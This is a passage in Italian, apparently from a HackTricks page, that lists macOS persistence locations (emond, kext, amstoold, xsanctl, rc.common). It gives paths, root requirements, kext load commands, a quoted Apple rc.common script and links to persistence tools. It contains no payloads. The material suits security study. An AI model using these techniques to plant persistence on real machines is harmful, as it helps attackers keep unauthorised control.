Per coloro che sono a conoscenza della sua esistenza, identificare qualsiasi uso malevolo di **emond** è semplice. Il LaunchDaemon di sistema per questo servizio cerca script da eseguire in una singola directory. Per ispezionare questo, è possibile utilizzare il seguente comando:
```bash
ls -l /private/var/db/emondClients
```
### ~~XQuartz~~

Writeup: [https://theevilbit.github.io/beyond/beyond_0018/](https://theevilbit.github.io/beyond/beyond_0018/)

#### Posizione

- **`/opt/X11/etc/X11/xinit/privileged_startx.d`**
- Richiesta di root
- **Attivazione**: Con XQuartz

#### Descrizione & Sfruttamento

XQuartz **non è più installato in macOS**, quindi se vuoi ulteriori informazioni controlla il writeup.

### ~~kext~~

> [!CAUTION]
> È così complicato installare kext anche come root che non lo considererò per sfuggire alle sandbox o anche per la persistenza (a meno che tu non abbia un exploit)

#### Posizione

Per installare un KEXT come elemento di avvio, deve essere **installato in una delle seguenti posizioni**:

- `/System/Library/Extensions`
- File KEXT integrati nel sistema operativo OS X.
- `/Library/Extensions`
- File KEXT installati da software di terze parti

Puoi elencare i file kext attualmente caricati con:
```bash
kextstat #List loaded kext
kextload /path/to/kext.kext #Load a new one based on path
kextload -b com.apple.driver.ExampleBundle #Load a new one based on path
kextunload /path/to/kext.kext
kextunload -b com.apple.driver.ExampleBundle
```
Per ulteriori informazioni su [**estensioni del kernel controlla questa sezione**](macos-security-and-privilege-escalation/mac-os-architecture/index.html#i-o-kit-drivers).

### ~~amstoold~~

Scrittura: [https://theevilbit.github.io/beyond/beyond_0029/](https://theevilbit.github.io/beyond/beyond_0029/)

#### Posizione

- **`/usr/local/bin/amstoold`**
- Richiesta root

#### Descrizione & Sfruttamento

A quanto pare il `plist` di `/System/Library/LaunchAgents/com.apple.amstoold.plist` stava usando questo binario mentre esponeva un servizio XPC... il problema è che il binario non esisteva, quindi potevi mettere qualcosa lì e quando il servizio XPC veniva chiamato, il tuo binario sarebbe stato chiamato.

Non riesco più a trovare questo nel mio macOS.

### ~~xsanctl~~

Scrittura: [https://theevilbit.github.io/beyond/beyond_0015/](https://theevilbit.github.io/beyond/beyond_0015/)

#### Posizione

- **`/Library/Preferences/Xsan/.xsanrc`**
- Richiesta root
- **Attivazione**: Quando il servizio viene eseguito (raramente)

#### Descrizione & sfruttamento

A quanto pare non è molto comune eseguire questo script e non sono riuscito nemmeno a trovarlo nel mio macOS, quindi se vuoi ulteriori informazioni controlla la scrittura.

### ~~/etc/rc.common~~

> [!CAUTION] > **Questo non funziona nelle versioni moderne di MacOS**

È anche possibile inserire qui **comandi che verranno eseguiti all'avvio.** Esempio di script rc.common regolare:
```bash
#
# Common setup for startup scripts.
#
# Copyright 1998-2002 Apple Computer, Inc.
#

######################
# Configure the shell #
######################

#
# Be strict
#
#set -e
set -u

#
# Set command search path
#
PATH=/bin:/sbin:/usr/bin:/usr/sbin:/usr/libexec:/System/Library/CoreServices; export PATH

#
# Set the terminal mode
#
#if [ -x /usr/bin/tset ] && [ -f /usr/share/misc/termcap ]; then
#    TERM=$(tset - -Q); export TERM
#fi

###################
# Useful functions #
###################

#
# Determine if the network is up by looking for any non-loopback
# internet network interfaces.
#
CheckForNetwork()
{
local test

if [ -z "${NETWORKUP:=}" ]; then
test=$(ifconfig -a inet 2>/dev/null | sed -n -e '/127.0.0.1/d' -e '/0.0.0.0/d' -e '/inet/p' | wc -l)
if [ "${test}" -gt 0 ]; then
NETWORKUP="-YES-"
else
NETWORKUP="-NO-"
fi
fi
}

alias ConsoleMessage=echo

#
# Process management
#
GetPID ()
{
local program="$1"
local pidfile="${PIDFILE:=/var/run/${program}.pid}"
local     pid=""

if [ -f "${pidfile}" ]; then
pid=$(head -1 "${pidfile}")
if ! kill -0 "${pid}" 2> /dev/null; then
echo "Bad pid file $pidfile; deleting."
pid=""
rm -f "${pidfile}"
fi
fi

if [ -n "${pid}" ]; then
echo "${pid}"
return 0
else
return 1
fi
}

#
# Generic action handler
#
RunService ()
{
case $1 in
start  ) StartService   ;;
stop   ) StopService    ;;
restart) RestartService ;;
*      ) echo "$0: unknown argument: $1";;
esac
}
```
## Tecniche e strumenti di persistenza

- [https://github.com/cedowens/Persistent-Swift](https://github.com/cedowens/Persistent-Swift)
- [https://github.com/D00MFist/PersistentJXA](https://github.com/D00MFist/PersistentJXA)

{{#include ../banners/hacktricks-training.md}}
